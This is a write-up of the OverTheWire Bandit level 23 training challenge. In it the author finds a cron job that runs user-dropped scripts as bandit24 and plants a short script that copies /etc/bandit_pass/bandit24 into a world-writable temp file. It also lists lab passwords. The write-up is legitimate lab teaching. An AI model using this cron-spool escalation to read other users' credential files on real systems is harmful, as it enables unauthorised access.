
# Bandit challenges
# Bandit 23#

## Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Access data

+ Username: bandit23
+ Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+ Port: 2220
+ Server: bandit.labs.overthewire.org
## Solution

```bash

ssh bandit23@bandit.labs.overthewire.org -p 2220
bandit23@bandit:~$ ls --all /etc/cron.d/
.   cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  .placeholder
..  cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir  sysstat
bandit23@bandit:~$ file /etc/cron.d/cronjob_bandit24
/etc/cron.d/cronjob_bandit24: ASCII text
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir -p /tmp/37183179
bandit23@bandit:~$ cd /tmp/37183179

bandit23@bandit:/tmp/37183179$ nano script.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/37183179$ chmod +rx script.sh
bandit23@bandit:/tmp/37183179$ chmod 777 /tmp/37183179
bandit23@bandit:/tmp/37183179$ chmod +rwx password
bandit23@bandit:/tmp/37183179$ ls -la
total 408
drwxrwxrwx   2 bandit23 bandit23   4096 Feb 25 01:33 .
drwxrwx-wt 499 root     root     405504 Feb 25 01:34 ..
-rwxrwxr-x   1 bandit23 bandit23      0 Feb 25 01:32 password
-rwxrwxr-x   1 bandit23 bandit23     67 Feb 25 01:33 script.sh
bandit23@bandit:/tmp/37183179$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/37183179$ cat password
bandit23@bandit:/tmp/37183179$ cat password
bandit23@bandit:/tmp/37183179$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/37183179$ chmod 666 password
bandit23@bandit:/tmp/37183179$ ls -al password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 25 01:32 password
bandit23@bandit:/tmp/37183179$ cat password
bandit23@bandit:/tmp/37183179$ cat script.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/37183179/password
bandit23@bandit:/tmp/37183179$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/37183179$ ls -al password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 25 01:32 password
bandit23@bandit:/tmp/37183179$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/37183179$

````

## Notes

## References